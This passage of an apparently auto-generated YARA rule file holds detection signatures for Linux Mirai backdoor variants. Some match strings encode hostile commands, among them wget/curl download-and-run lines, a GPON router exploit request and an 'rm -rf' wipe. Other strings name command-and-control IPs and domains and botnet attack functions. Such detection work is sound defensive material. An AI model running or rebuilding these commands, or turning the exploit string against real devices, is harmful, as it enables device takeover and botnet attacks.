        $x_1_2 = {03 10 96 e7 5c 30 9d e5 00 00 52 e3 01 2a a0 03 01 00 73 e3 00 20 81 e5 09 00 00 1a dc 00 00 eb 00 40 a0 e1 f1 00 00 eb 00 00 54 e1 0e 00 00 1a 0e 01 00 eb 00 40 a0 e1 e7 00 00 eb 00 00 54 e1 09 00 00 1a}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Linux_Mirai_BT_2147827140_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BT!MTB"
        threat_id = "2147827140"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {89 45 d8 8d 04 d5 1e 00 00 00 83 e0 f0 29 c4 31 c0 8d 74 24 0f 83 e6 f0}  //weight: 2, accuracy: High
        $x_1_2 = {31 c0 89 45 08 f0 83 0c 24 00 8b 44 24 10 05 e4 d0 04 08 8b 40 08 85 c0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BZ_2147827141_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BZ!MTB"
        threat_id = "2147827141"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {03 10 a0 e3 11 20 a0 e3 02 00 a0 e3 1a 10 00 eb 01 80 a0 e3 04 c0 a0 e3 00 10 a0 e3 03 20 a0 e3 0b 30 a0 e1 0a 00 84 e7 00 c0 8d e5 0c 40 84 e0 1c 80 8d e5 fe 0f 00 eb 01 00 70 e3 ed ff ff 1a 09 00 a0 e1 09 10 a0 e3 0e 0c 00 eb}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CW_2147827455_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CW!MTB"
        threat_id = "2147827455"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "u2ekcv.mooo.com" ascii //weight: 1
        $x_1_2 = "{czdot&\"neezd}t8=?1t" ascii //weight: 1
        $x_1_3 = "tedzdot" ascii //weight: 1
        $x_1_4 = "{agczgbt|" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CY_2147827456_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CY!MTB"
        threat_id = "2147827456"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {77 67 65 74 2b 68 74 74 70 3a 2f 2f [0-32] 2b 2d 4f 2b 2d 3e [0-2] 2f 74 6d 70 2f [0-8] 3b 73 68 2b 2f 74 6d 70 2f [0-8] 26 69 70 76 3d 30}  //weight: 1, accuracy: Low
        $x_1_2 = "POST /GponForm/diag_Form?" ascii //weight: 1
        $x_1_3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CX_2147827511_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CX!MTB"
        threat_id = "2147827511"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {0c 31 93 e7 1f 20 00 e2 01 60 a0 e3 16 32 83 e1 0e 00 50 e1 0e 00 a0 b1 0c 31 81 e7 01 ea 8d e2 0a c0 a0 e3 e4 c1 8e e5 47 cd 8d e2 00 50 a0 e3 24 c0 8c e2 42 1d 8d e2 01 2a 8d e2 00 c0 8d e5 06 00 80 e0 04 10 81 e2 04 20 82 e2 05 30 a0 e1 e8 51 8e e5 e0 02 00 eb 05 00 58 e1 00 40 a0 e1 05 20 a0 c1 08 00 a0 c1 ec 13 9f c5 7e 02 00 cb 01 00 74 e3 94 00 00 0a}  //weight: 1, accuracy: High
        $x_1_2 = {30 d2 e7 65 30 23 e2 00 30 c2 e7 01 20 82 e2 01 00 52 e1}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_BQ_2147827722_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.BQ!xp"
        threat_id = "2147827722"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "ROCRYSYRC" ascii //weight: 2
        $x_1_2 = "npxxoudiffeeggaacscs" ascii //weight: 1
        $x_1_3 = "hlLjztqZ" ascii //weight: 1
        $x_1_4 = "kkvettgaaasecnnaaaa" ascii //weight: 1
        $x_1_5 = "107.174.241.209" ascii //weight: 1
        $x_1_6 = "hkjmlona" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_1_*))) or
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_CK_2147827832_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CK!xp"
        threat_id = "2147827832"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rm -rf /tmp/* /var/* /var/run/* /var/tmp/*" ascii //weight: 1
        $x_1_2 = {00 24 44 8d 94 00 00 28 21 8f 99 81 c4 00 00 00 00 03 20 f8 09 00}  //weight: 1, accuracy: High
        $x_1_3 = {24 42 db 38 ac 43 00 04 8f c3}  //weight: 1, accuracy: High
        $x_1_4 = {00 24 42 db 38 ac 43 00 08 24 02 00 03 af c2 00 08}  //weight: 1, accuracy: High
        $x_1_5 = {80 18 00 02 20 80 24 62 db 38 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_CV_2147828187_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CV!MTB"
        threat_id = "2147828187"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "botkill" ascii //weight: 1
        $x_1_2 = {8b 44 24 28 c7 44 24 04 02 00 00 00 89 44 24 08 8b 44 24 20 89 04 24 e8 72 8f 00 00 eb c6}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DN_2147828188_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DN!MTB"
        threat_id = "2147828188"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {75 20 8b 29 89 c8 29 e8 8b 70 08 8b 50 0c 8b 4e 0c 39 c1 75 3d 39 4a 08 75 38 01 ef 89 56 0c 89 72 08}  //weight: 1, accuracy: High
        $x_1_2 = {83 c4 10 85 ff 74 19 31 c0 81 bc 24 a8 01 00 00 ff 64 cd 1d 0f 9f c0 03 84 24 a4 01 00 00}  //weight: 1, accuracy: High
        $x_1_3 = "/dev/null" ascii //weight: 1
        $x_1_4 = "TSource Engine Query" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DN_2147828188_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DN!MTB"
        threat_id = "2147828188"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ripper_make_tcp_pkt" ascii //weight: 1
        $x_1_2 = "ripper_make_icmp_pkt" ascii //weight: 1
        $x_1_3 = "ripper_rand" ascii //weight: 1
        $x_1_4 = "ripper_randstr" ascii //weight: 1
        $x_1_5 = "ripper_parsebuf" ascii //weight: 1
        $x_1_6 = "cncpacket_destroy_recv_data" ascii //weight: 1
        $x_1_7 = "cncpacket_create_recv_data" ascii //weight: 1
        $x_1_8 = "kommit_suikide" ascii //weight: 1
        $x_1_9 = "locker_set_mode" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AR_2147828432_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AR!MTB"
        threat_id = "2147828432"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 ea 04 30 dc e5 02 00 53 e1 08 c0 8c e2 06 00 00 0a 01 e0 8e e2 0e 00 50 e1 0c 10 a0 e1 f7 ff ff 1a 04 00 a0 e1 10 40 bd e8 1e ff 2f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CM_2147828580_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CM!xp"
        threat_id = "2147828580"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 c8 8d 44 24 21 28 00 00 c4 81 99 8f 00 00 00 00 09 f8 20 03 00}  //weight: 1, accuracy: High
        $x_1_2 = {00 d8 8d 42 24 18 00 c2 af 2b}  //weight: 1, accuracy: High
        $x_1_3 = {80 82 8f 00 00 00 00 04 8e 44 24 21 28 00 00 c4}  //weight: 1, accuracy: High
        $x_1_4 = {00 18 8e 42 24 18 00 c2 af 05}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CN_2147828986_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CN!xp"
        threat_id = "2147828986"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {a7 8c 08 00 e0 03 21 10 e0 00 06 00 1c 3c 4c b4 9c}  //weight: 1, accuracy: High
        $x_1_2 = {18 83 99 8f 01 00 04 26 09 f8 20 03 01 00}  //weight: 1, accuracy: High
        $x_1_3 = {00 a4 8c 00 00 00 00 fb ff 80 10 00 00 00 00 ec}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CO_2147828987_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CO!xp"
        threat_id = "2147828987"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 79 90 12 21 64 96 12 e0 94 98}  //weight: 1, accuracy: High
        $x_1_2 = {dc 00 01 1e 3c 00 01 1e 0c 03}  //weight: 1, accuracy: High
        $x_1_3 = {20 01 a8 10 00 08 40 00 08 42 90 10 00}  //weight: 1, accuracy: High
        $x_1_4 = {10 21 00 40 00 24 ff 90 10 20 24 40}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CJ_2147829079_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CJ!xp"
        threat_id = "2147829079"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox chmod 777" ascii //weight: 1
        $x_1_2 = "rm rf Cronusmips)" ascii //weight: 1
        $x_1_3 = "/root/dvr_gui/" ascii //weight: 1
        $x_1_4 = "/usr/bin/nload" ascii //weight: 1
        $x_1_5 = "3.136.41.111 " ascii //weight: 1
        $x_1_6 = {00 75 92 12 61 20 40 00 00 ac}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CL_2147829082_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CL!xp"
        threat_id = "2147829082"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {99 88 13 0d 1e 00 00 00 00 8c 9b 01 00 8c 9b 01 00 94}  //weight: 1, accuracy: High
        $x_1_2 = {de f4 90 f7 20 ed 0a 87 ff 5b 46 3f 98}  //weight: 1, accuracy: High
        $x_1_3 = {4b df db 9b 4a eb cc 76 8f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_CQ_2147830791_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.CQ!xp"
        threat_id = "2147830791"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 27 39 d8 90 03 20 f8 09 00}  //weight: 1, accuracy: High
        $x_1_2 = {82 04 34 13 ff ff 14 40 00 37 26 32 00 14 8f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DD_2147832440_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DD!MTB"
        threat_id = "2147832440"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 82 4e 92 72 ff b2 80 67 20 4a 80 66 24 2f 2e 00 08 61 ff 00 00 fc 30 61 ff 00 00 ab d6 48 78 00 09 2f 00 61 ff 00}  //weight: 1, accuracy: High
        $x_1_2 = {00 73 2f 05 61 ff 00 00 e2 60 2a 48 42 a7 48 78 00 02 2f 02 2f 03 45 f9 80 00 06 00 4e 92}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DB_2147832483_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DB!MTB"
        threat_id = "2147832483"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "attack_vector_udp" ascii //weight: 1
        $x_1_2 = "killer_pid" ascii //weight: 1
        $x_1_3 = "killer_kill_by_port" ascii //weight: 1
        $x_1_4 = "attack_kill_all" ascii //weight: 1
        $x_1_5 = "killer_realpath" ascii //weight: 1
        $x_1_6 = "attack_ongoing" ascii //weight: 1
        $x_1_7 = "init_killer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_DH_2147832627_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DH!MTB"
        threat_id = "2147832627"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {05 00 1c 3c ?? ?? 9c 27 21 e0 99 03 e0 ff bd 27 1c 00 bf af 18 00 b0 af 10 00 bc af 52 10 02 24 0c 00 00 00 ?? ?? 99 8f 06 00 e0 10 21 80 40 00 09 f8 20 03 00 00 00 00 10 00 bc 8f 00 00 50 ac ff ff 02 24 1c 00 bf 8f 18 00 b0 8f 08 00 e0 03 20 00 bd 27}  //weight: 1, accuracy: Low
        $x_1_2 = {08 00 40 10 18 00 a2 27 10 82 99 8f c0 20 04 00 21 20 44 00 21 28 00 02 09 f8 20 03 08 00 06 24 10 00 bc 8f 08 00 10 26 00 00 04 8e 00 00 00 00 f3 ff 80 14}  //weight: 1, accuracy: High
        $x_1_3 = "ROCRYSYRC" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DC_2147833473_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DC!MTB"
        threat_id = "2147833473"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "attack_tcp.c" ascii //weight: 1
        $x_1_2 = "chacha20_quarterround" ascii //weight: 1
        $x_1_3 = "attack_udp.c" ascii //weight: 1
        $x_1_4 = "mylock" ascii //weight: 1
        $x_1_5 = "flood_tcp_ack" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_DE_2147837899_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DE!MTB"
        threat_id = "2147837899"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 68 65 6c 6c 3a 63 64 20 2f 64 61 74 61 2f 6c 6f 63 61 6c 2f 74 6d 70 3b 20 62 75 73 79 62 6f 78 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-21] 2f 77 67 65 74 20 2d 4f 20 2d 3e 20 77 77 77 77}  //weight: 1, accuracy: Low
        $x_1_2 = {63 75 72 6c 20 2d 4f 20 68 74 74 70 3a 2f 2f [0-21] 2f 63 75 72 6c 3b 20 73 68 20 63 75 72 6c 3b 20 72 6d 20 77 77 77 77 20 63 75 72 6c}  //weight: 1, accuracy: Low
        $x_1_3 = "infected" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DI_2147840267_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DI!MTB"
        threat_id = "2147840267"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "medusa-stealer.cc" ascii //weight: 1
        $x_1_2 = "medusa_cnc" ascii //weight: 1
        $x_1_3 = "scrape_data" ascii //weight: 1
        $x_1_4 = "udp_flood" ascii //weight: 1
        $x_1_5 = "spoofer_process_name" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_DK_2147842819_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DK!MTB"
        threat_id = "2147842819"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "/bin/busybox boat" ascii //weight: 5
        $x_1_2 = "scanner_kill" ascii //weight: 1
        $x_1_3 = "ripper_attack" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_DA_2147843278_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DA!MTB"
        threat_id = "2147843278"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {b0 30 d7 e1 40 00 13 e3 1e 00 00 0a 38 40 87 e2 04 20 a0 e1 08 10 9d e5 05 00 a0 e1 0b c0 99 e7 0f e0 a0 e1 1c ff 2f e1 04 00 a0 e1 08 c0 99 e7 0f e0 a0 e1 1c ff 2f e1 b0 30 d7 e1 0c 20 9d e5 03 30 82 e1 05 3d 23 e2 0d 0d 13 e3 08 00 00 1a 07 00 a0 e1}  //weight: 1, accuracy: High
        $x_1_2 = {ac 30 9f e5 18 40 80 e2 04 20 a0 e1 03 10 96 e7 0d 00 a0 e1 9c 30 9f e5 03 c0 96 e7 0f e0 a0 e1 1c ff 2f e1 00 80 e0 e3 04 00 a0 e1 88 30 9f e5 03 c0 96 e7 0f e0 a0 e1 1c ff 2f e1 00 40 97 e5 01 10 a0 e3 74 30 9f e5 0d 00 a0 e1 00 80 87 e5 03 c0 96 e7 0f e0 a0 e1 1c ff 2f e1 0c 00 97 e5}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DL_2147844755_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DL!MTB"
        threat_id = "2147844755"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {0d 0a 0a 0d 00 00 00 00 4b 6f 6d 6f 72 65 62 69 0d 0a}  //weight: 1, accuracy: High
        $x_1_2 = {31 39 33 2e 34 32 2e 33 32 2e 31 37 35 00 00 00 2f}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DM_2147844756_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DM!MTB"
        threat_id = "2147844756"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "193.42.32.175" ascii //weight: 1
        $x_1_2 = {2e 73 68 73 74 72 74 61 62 00 2e 69 6e 69 74 00 2e 74 65 78 74 00 2e 66 69 6e 69 00 2e 72 6f 64 61 74 61 00 2e 63 74 6f 72 73 00 2e 64 74 6f 72 73 00 2e 64 61 74 61}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DO_2147844882_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DO!MTB"
        threat_id = "2147844882"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {02 51 20 21 ?? 62 00 00 ?? ?? ?? ?? 38 42 00 37 a0 62 00 00 24 63 00 01}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DP_2147849354_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DP!MTB"
        threat_id = "2147849354"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/tmp/condinetwork" ascii //weight: 1
        $x_1_2 = "/var/condibot" ascii //weight: 1
        $x_1_3 = {7c 08 02 a6 94 21 ff f0 90 01 00 14 80 03 00 0c 2f 80 00 01 41 9e 00 2c 41 bd 00 10 2f 80 00 00 41 9e 00 50 48 00 00 14 2f 80 00 02 41 9e 00 54 2f 80 00 03 41 9e 00 6c 39 20 00 16 48 00 00 74}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DJ_2147849384_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DJ!MTB"
        threat_id = "2147849384"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "/var/CondiBot" ascii //weight: 1
        $x_1_2 = "boatnet" ascii //weight: 1
        $x_1_3 = {2f 62 69 6e 2f 7a 68 74 74 70 64 2f ?? ?? ?? ?? ?? ?? 63 64 ?? ?? ?? ?? ?? ?? 2f 74 6d 70 3b ?? ?? ?? ?? ?? ?? 72 6d ?? ?? ?? ?? ?? ?? 2d 72 66 ?? ?? ?? ?? ?? ?? 2a 3b ?? ?? ?? ?? ?? ?? 77 67 65 74 ?? ?? ?? ?? ?? ?? 68 74 74 70 3a 2f 2f [0-21] 2f 6d 69 70 73 3b ?? ?? ?? ?? ?? ?? 63 68 6d 6f 64}  //weight: 1, accuracy: Low
        $x_1_4 = "/tmp/condinetwork" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DQ_2147849775_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DQ!MTB"
        threat_id = "2147849775"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "/var/CondiBot" ascii //weight: 1
        $x_1_2 = "/tmp/zxcr9999" ascii //weight: 1
        $x_1_3 = {77 67 65 74 [0-6] 3a 2f 2f 63 64 6e 32 2e 64 75 63 33 6b 2e 63 6f 6d 2f 74 20 2d 4f 2d 7c 73 68}  //weight: 1, accuracy: Low
        $x_1_4 = "POST /cgi-bin/luci/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DR_2147850539_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.DR!MTB"
        threat_id = "2147850539"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "oob,6-3#+Tjmgltp#MW#23-38#TLT57*#BssofTfaHjw,604-05#+HKWNO/#ojhf#Df`hl*#" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_DS_2147851372_0
{
    meta:
        author = "defender2yara"
